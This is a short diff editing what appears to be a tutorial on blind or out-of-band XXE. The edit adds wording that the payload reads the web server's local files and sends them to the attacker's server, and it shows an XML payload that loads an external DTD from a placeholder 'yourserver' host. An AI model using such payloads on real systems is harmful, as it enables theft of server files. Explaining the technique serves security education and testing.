@@ -58,9 +58,9 @@ Okay,
 
 Still you can confirm the existence of the vulnerability by using the first payload above. But you can't see the file contents of local files of webserver. This is still an issue but now the severity is a ***little bit low.*** And, this is called Blind XXE OR Out-of-band XXE.
 
-So we also needed to blind means we have to use blind payload.
+So we also needed to blind means we have to use blind payload which will grep the contents of the local files of the webserver and send the contents to our server. Sound interesting, let's see how this whole theory works and also let's see that if we have some alternatives to do that.
 
-`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM 'http://yourserver/xml.dtd'> %test; %exe]><root>&entity;</root>`
+Payload:- `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM 'http://yourserver/xml.dtd'> %test; %exe]><root>&entity;</root>`
 
 Your xml.dtd contents:- 
 
